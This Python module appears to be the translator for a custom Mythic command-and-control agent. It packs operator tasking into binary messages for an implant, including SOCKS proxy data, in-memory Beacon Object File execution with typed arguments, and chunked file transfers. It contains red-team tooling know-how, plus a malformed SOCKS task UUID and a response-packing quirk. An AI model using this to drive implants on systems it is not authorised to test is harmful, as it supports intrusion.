from Translator.Utils import *

import ipaddress

async def CheckinImp( new, old ):
    Dbg1( "------------------------" );

    search_resp: MythicRPCAgentStorageSearchMessageResponse = await SendMythicRPCAgentStorageSearch(MythicRPCAgentStorageSearchMessage(
        old
    ))

    await SendMythicRPCAgentStorageCreate(MythicRPCAgentstorageCreateMessage(
        new, search_resp.AgentStorageMessages[0]["data"].encode("utf-8")
    ))

    await SendMythicRPCAgentStorageRemove(MythicRPCAgentStorageRemoveMessage(
        old
    ))

    Dbg1( f"old: {old}" )
    Dbg1( f"new: {new}" )

    Data = new.encode();

    Dbg1( f"data: {Data}" );

    Dbg1( "------------------------" );

    return Data;

def RespTasking(Tasks, Socks) -> bytes:
    Dbg3("------------------------")

    Pkg        = Packer()
    JobID      = Jobs["get_tasking"]["hex_code"]
    TaskLength = len( Tasks ) + len( Socks )  

    Dbg3(f"task quantity {TaskLength}")

    # Start building main package
    Pkg.Int8(JobID)
    Pkg.Int32(TaskLength)

    for Sock in Socks:
        SockPkg = Packer()
        
        SrvId = Sock["server_id"]
        Data = Sock["data"]
        Ext = 1 if Sock["exit"] else 0  # Simplified boolean to int conversion
        TaskUUIDSck = "55555555-5555-5555-555-555555555555"

        Dbg3(f"socks exit: {Ext}")
        Dbg3(f"socks id: {SrvId}")

        if Data is not None:
            Dbg3(f"socks data: {Data[:30]} [{len(base64.b64decode(Data))} bytes]")
        
        # Build sock package
        SockPkg.Int16(T_SOCKS)
        SockPkg.Int32(Ext)
        SockPkg.Int32(SrvId)

        if Data is not None:
            SockPkg.Bytes(Data.encode())

        # Add to main package
        Pkg.Bytes(TaskUUIDSck.encode())
        Pkg.Bytes(SockPkg.buffer)

    # Add regular tasks
    for Task in Tasks:
        Command = Task["command"]
        TaskUUID = Task["id"].encode()

        # Process parameters
        Parameters = {}
        if Task["parameters"]:
            try:
                if isinstance(Task["parameters"], str):
                    Parameters = json.loads(Task["parameters"])
                elif isinstance(Task["parameters"], dict):
                    Parameters = Task["parameters"]
            except (json.JSONDecodeError, TypeError):
                Parameters = {}

        Pkg.Bytes(TaskUUID)
        tsk_psr = Packer()

        # Handle command and subcommand
        if "action" in Parameters:
            main_cmd = Command
            sub_cmd = Parameters["action"]

            if main_cmd in Commands and 'subcommands' in Commands[main_cmd]:
                CommandID = Commands[main_cmd]['hex_code']
                
                if sub_cmd in Commands[main_cmd]['subcommands']:
                    SubCommandID = Commands[main_cmd]['subcommands'][sub_cmd]['sub']
                else:
                    Dbg3(f"Unknown subcommand: {sub_cmd}")
                    continue
            else:
                Dbg3(f"Command doesn't support subcommands: {main_cmd}")
                continue
        else:
            CommandID = Commands[Command]['hex_code'] if Command in Commands else None
            if not CommandID:
                Dbg3(f"Unknown command: {Command}")
                continue
            SubCommandID = 0

        tsk_psr.Int16(int(CommandID))
        Dbg3(f"command id: {CommandID}")
        
        if SubCommandID != 0:
            tsk_psr.Int8(SubCommandID)
            Dbg3(f"sub id: {SubCommandID}")

        # Special handling for BOF command
        if CommandID == Commands["exec-bof"]["hex_code"]:
            args_buffer = Packer()
            
            if "bof_file" in Parameters:
                try:
                    file_bytes = bytes.fromhex(Parameters["bof_file"])
                    tsk_psr.Bytes(file_bytes)
                except Exception as e:
                    Dbg3(f"Failed to process bof_file: {str(e)}")
                    raise ValueError(f"Invalid bof_file content: {str(e)}")
            
            if "bof_id" in Parameters:
                tsk_psr.Int32( Parameters["bof_id"] )

            BofArgs = []
            if "bof_args" in Parameters:
                BofArgs = ast.literal_eval(Parameters["bof_args"])

            if BofArgs and isinstance(BofArgs, list):
                Dbg3(f"Processing bof_args: {BofArgs}")
                for arg in BofArgs:
                    try:
                        if isinstance(arg, dict) and "type" in arg and "value" in arg:
                            arg_type = arg["type"]
                            value = arg["value"]
                            Dbg3(f"Processing argument - type: {arg_type}, value: {value}")
                            
                            if arg_type == "int16":
                                args_buffer.Int16(int(value))
                            elif arg_type == "int32":
                                args_buffer.Int32(int(value))
                            elif arg_type == "bytes":
                                args_buffer.Bytes(bytes.fromhex(value))
                            elif arg_type == "char":
                                args_buffer.Bytes(str(value).encode("utf-8"))
                            elif arg_type == "wchar":
                                args_buffer.Bytes(str(value).encode("utf-16"))
                            elif arg_type == "base64":
                                try:
                                    decoded = base64.b64decode(value)
                                    args_buffer.Pad(decoded)
                                except Exception:
                                    Dbg3(f"Invalid base64: {value}")
                                    raise ValueError(f"Invalid base64: {value}")
                            else:
                                Dbg3(f"Unknown argument type: {arg_type}")
                                raise ValueError(f"Unknown argument type: {arg_type}")
                        else:
                            Dbg3(f"Invalid argument format: {arg}")
                            raise ValueError(f"Invalid argument format: {arg}")
                    except Exception as e:
                        Dbg3(f"Failed to process argument {arg}: {str(e)}")
                        raise ValueError(f"Failed to process argument {arg}: {str(e)}")

            Dbg3(f"[{args_buffer.length}] {args_buffer.buffer}")
            tsk_psr.Int32(args_buffer.length) 
            tsk_psr.Pad(args_buffer.buffer)
        else:
            # Handle regular parameters
            for Key, Val in Parameters.items():
                if Key != "action":
                    try:
                        hex_bytes = bytes.fromhex(Val)
                        Dbg3(f"key: {Key} | parameter with len: {len(hex_bytes)} [type: hex:bytes]")
                        tsk_psr.Pad(hex_bytes)
                    except (ValueError, AttributeError, TypeError):
                        if isinstance(Val, str):
                            Dbg3(f"key: {Key} | parameter: {Val} [type: str]")
                            tsk_psr.Bytes(str(Val).encode())
                        elif isinstance(Val, int):
                            Dbg3(f"key: {Key} | parameter: {int(Val)} [type: int]")
                            tsk_psr.Int32(int(Val))
                        elif isinstance(Val, bool):
                            Dbg3(f"key: {Key} | parameter: {int(Val)} [type: bool]")
                            tsk_psr.Int32(int(Val))
                        elif isinstance(Val, bytes):
                            Dbg3(f"key: {Key} | parameter: {len(Val)} [type: bytes]")
                            tsk_psr.Pad(Val)

        Pkg.Bytes(tsk_psr.buffer)
        Dbg3(f"task uuid: {TaskUUID} with [{len(tsk_psr.buffer)} bytes]")

    Dbg3("------------------------")
    return Pkg.buffer

def RespPosting( Responses ):
    Dbg2( "------------------------" );

    Dbg2( f"responses: {Responses}" );

    Data = len( Responses ).to_bytes( 4, "big" );
    
    if not Responses:
        Dbg2("No responses to post.")
        return Data

    Pkg = Packer();

    for Response in Responses:
        if Response["status"] == "success":
            Data += b"\x01";
        else: 
            Data += b"\x00";
    
    Dbg2( f"status: {Response['status']}" );

    if Response["status"] == "success":
        Pkg.Int32( 1 );
    else: 
        Pkg.Int32( 0 );
    
    for Response in Responses:
        FileID = Response.get( "file_id" )
        if FileID:
            Pkg.Bytes( FileID.encode( "utf-8" ) );
            Dbg2( f"file id: {FileID}" );

        TotalChunks = Response.get( "total_chunks" );
        if TotalChunks:
            Pkg.Int32( TotalChunks );
            Dbg2( f"total chunks: {TotalChunks}" );

        ChunkNbr = Response.get( "chunk_num" );
        if ChunkNbr:
            Pkg.Int32( ChunkNbr );
            Dbg2( f"chunk number: {ChunkNbr}" );
        
        ChunkData = Response.get( "chunk_data" );
        if ChunkData:
            Pkg.Bytes( base64.b64decode( ChunkData ) );
            Dbg2( f"Chunk Data: {len( base64.b64decode( ChunkData ) )} bytes" );
            Data = Pkg.buffer;

    Dbg2( "------------------------" );
    
    return Data
